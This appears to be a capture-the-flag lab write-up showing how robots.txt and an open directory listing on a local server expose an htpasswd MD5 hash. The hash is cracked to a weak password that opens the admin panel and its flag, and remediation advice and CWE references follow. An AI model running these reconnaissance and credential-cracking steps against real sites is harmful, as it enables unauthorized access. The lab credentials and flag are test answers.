# Robots.txt Disclosure → Admin Compromise

**One‑liner:** `robots.txt` reveals hidden paths. A browsable `/whatever/` directory exposes an `htpasswd`‑style hash (`MD5`) that can be cracked to log into `/admin/` and retrieve a flag.

---

## Where

* **robots:** `http://127.0.0.1:8080/robots.txt`

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

* **Directory listing:** `http://127.0.0.1:8080/whatever/` → shows `htpasswd`
* **Admin panel:** `http://127.0.0.1:8080/admin/`
* **Auth:** none (to read `robots.txt` and `/whatever/`)

---

## How to reproduce

1. **Read robots.txt**

```
GET /robots.txt
```

It explicitly lists `/whatever` and `/.hidden`.

2. **Open the hinted folder**

```
GET /whatever/
```

Auto‑index reveals:

```
htpasswd
```

3. **Retrieve the credential file**

```
GET /whatever/htpasswd
```

Observed content:

```
root:437394baff5aa33daa618be47b75cb49
```

4. **Crack the hash** (dictionary/CrackStation/offline). The hash is **MD5** of a weak password:

```
MD5("qwerty123@") = 437394baff5aa33daa618be47b75cb49
```

5. **Login to admin**

* URL: `/admin/`
* Credentials: `root : qwerty123@`

**Observed:** admin page returns the flag

```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```
---

## Impact

* **Information disclosure → Auth bypass.** Attackers learn sensitive paths, fetch hashes, crack them, and gain admin access.
* Broad foothold for further compromise.

**Severity:** High (no auth needed to discover and extract credentials; leads to privileged access).

---

## Fix (server‑side — mandatory)

1. **Do not rely on robots.txt for secrecy.** Remove sensitive paths from `robots.txt` or serve a minimal file.
2. **Disable directory indexes** on all folders (`Options -Indexes` / `autoindex off;`).
3. **Move secrets out of web root.** Do not expose `htpasswd`/backups/configs via HTTP.
4. **Strong credential storage:**

   * Hash passwords with **Argon2id** or **bcrypt** (unique salt, high cost).
   * Enforce strong passwords and prevent reuse.
5. **Protect admin panel:**

   * Require proper authentication (no default/weak creds), rate limit + lockout, 2FA if possible.
   * Restrict by IP/VPN in high‑risk environments.
6. **Continuous checks:** CI/CD lint for accidental directory listing or credential files under webroot.
---

## References

* OWASP Top 10 **A05:2021 – Security Misconfiguration**
* CWE‑548: **Information Exposure Through Directory Listing**
* CWE‑200: **Exposure of Sensitive Information to an Unauthorized Actor**
* CWE‑759 / CWE‑328: **One‑Way Hash Without a Salt / Use of Weak Hash**

--- 
## See also
**index** → [here](/README.md)